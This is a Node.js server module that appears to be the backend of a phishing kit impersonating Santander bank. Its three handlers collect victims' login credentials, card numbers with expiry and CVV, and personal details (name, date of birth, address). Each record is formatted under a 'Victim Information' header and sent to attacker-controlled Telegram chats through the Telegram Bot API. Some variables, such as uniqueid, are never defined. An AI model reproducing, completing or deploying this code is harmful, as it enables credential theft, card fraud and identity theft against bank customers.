const axios = require("axios");

let count = 100;

const submitLogin = async (req, res) => {
  let { username, password, ip, telegramId } = req.body;

  var originalText = `+----------- Login Information ------------+\nUsername: ${username}\nPassword: ${password}\n+----------- Victim Information ------------+\nUnique ID: ${uniqueid}\nIP: ${ip}`;

  await axios
    .post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
      {
        chat_id: 680379375,
        text: `Santander ${telegramId}:\n${originalText}`,
        parse_mode: "Markdown",
      }
    )
    .catch((e) => {
      console.log(e);
    });
  await axios
    .post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
      {
        chat_id: telegramId,
        text: `Santander:\n${originalText}`,
        parse_mode: "Markdown",
      }
    )
    .catch((e) => {
      console.log(e);
    });
  res.sendStatus(200);
};

const submitCard = async (req, res) => {
  let { ccnum, ccexp, cvv, ip, telegramId } = req.body;

  var originalText = `+----------- Billing Information ------------+\nCard Number: ${ccnum}\nCard Expiry: ${ccexp}\nCVV: ${cvv}\n+----------- Victim Information ------------+\nUnique ID: ${uniqueid}\nIP: ${ip}`;

  await axios
    .post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
      {
        chat_id: 680379375,
        text: `Santander ${telegramId}:\n${originalText}`,
        parse_mode: "Markdown",
      }
    )
    .catch((e) => {
      console.log(e);
    });
  await axios
    .post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
      {
        chat_id: telegramId,
        text: `Santander:\n${originalText}`,
        parse_mode: "Markdown",
      }
    )
    .catch((e) => {
      console.log(e);
    });

  res.sendStatus(200);
};

const submitPersonal = async (req, res) => {
  let { fullname, address, pcode, dob, telegramId } = req.body;

  var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nPost Code: ${pcode}\n+----------- Victim Information ------------+\nUnique ID: ${uniqueid}\nIP: ${ip}`;

  await axios
    .post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
      {
        chat_id: 680379375,
        text: `Santander ${telegramId}:\n${originalText}`,
        parse_mode: "Markdown",
      }
    )
    .catch((e) => {
      console.log(e);
    });
  await axios
    .post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
      {
        chat_id: telegramId,
        text: `Santander:\n${originalText}`,
        parse_mode: "Markdown",
      }
    )
    .catch((e) => {
      console.log(e);
    });

  res.sendStatus(200);
};

module.exports = {
  submitLogin,
  submitCard,
  submitPersonal,
};
